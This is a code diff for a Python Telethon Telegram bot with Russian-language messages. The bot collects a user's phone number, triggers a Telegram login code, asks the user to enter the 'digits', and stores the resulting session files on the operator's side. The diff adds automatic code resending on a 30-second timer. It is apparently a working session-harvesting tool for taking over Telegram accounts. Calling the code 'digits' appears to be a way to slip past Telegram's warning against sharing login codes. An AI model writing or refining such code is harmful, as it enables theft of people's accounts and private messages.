@@ -11,7 +11,6 @@ os.makedirs("sessions", exist_ok=True)
 user_states = {}
 
 async def main():
-    # БОТ (единственный вызов .start() с токеном)
     bot = await TelegramClient("sessions/bot_session", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
     
     @bot.on(events.NewMessage(pattern='/start'))
@@ -37,7 +36,6 @@ async def main():
             phone = '+' + phone
         
         try:
-            # Клиент для пользователя — НЕ .start(), только .connect()
             client = TelegramClient(f"sessions/user_{chat_id}", API_ID, API_HASH)
             await client.connect()
             
@@ -47,13 +45,39 @@ async def main():
                 'step': 'wait_code',
                 'client': client,
                 'phone': phone,
-                'phone_code_hash': sent.phone_code_hash
+                'phone_code_hash': sent.phone_code_hash,
+                'code_attempts': 0
             }
             await event.reply(f'✅ Цифры отправлены на {phone}. Введи цифры (4-6 знаков):')
+            
+            # ЗАПУСКАЕМ ТАЙМЕР НА 30 СЕКУНД
+            asyncio.create_task(code_timeout(chat_id, event))
         except Exception as e:
             await event.reply(f'❌ Ошибка: {str(e)[:150]}')
             if chat_id in user_states:
                 del user_states[chat_id]
+
+    async def code_timeout(chat_id, event):
+        await asyncio.sleep(30)
+        if chat_id in user_states and user_states[chat_id].get('step') == 'wait_code':
+            state = user_states[chat_id]
+            state['code_attempts'] += 1
+            if state['code_attempts'] <= 2:
+                # ПОВТОРНО ОТПРАВЛЯЕМ КОД
+                try:
+                    client = state['client']
+                    sent = await client.send_code_request(state['phone'])
+                    state['phone_code_hash'] = sent.phone_code_hash
+                    await event.reply(f'⏳ Отправлены новые цифры (попытка {state["code_attempts"]}). Введи их:')
+                    asyncio.create_task(code_timeout(chat_id, event))
+                except Exception:
+                    await event.reply('❌ Ошибка при повторной отправке. Нажми /start.')
+                    if chat_id in user_states:
+                        del user_states[chat_id]
+            else:
+                await event.reply('❌ Слишком много попыток. Нажми /start заново.')
+                if chat_id in user_states:
+                    del user_states[chat_id]
 
     @bot.on(events.NewMessage(pattern=r'^\d{4,6}$'))
     async def get_code(event):
@@ -83,8 +107,9 @@ async def main():
             error = str(e)
             if 'CODE_INVALID' in error or 'PHONE_CODE_INVALID' in error:
                 await event.reply('❌ Неверные цифры. Нажми /start заново.')
-            elif 'EXPIRED' in error:
-                await event.reply('❌ Цифры устарели. Нажми /start заново.')
+            elif 'EXPIRED' in error or 'TIMEOUT' in error:
+                # Если код истёк, таймер уже отправит новый
+                await event.reply('⏳ Цифры устарели. Жди новые или нажми /start.')
             else:
                 await event.reply(f'❌ Ошибка: {error[:150]}. Нажми /start заново.')
             if chat_id in user_states:
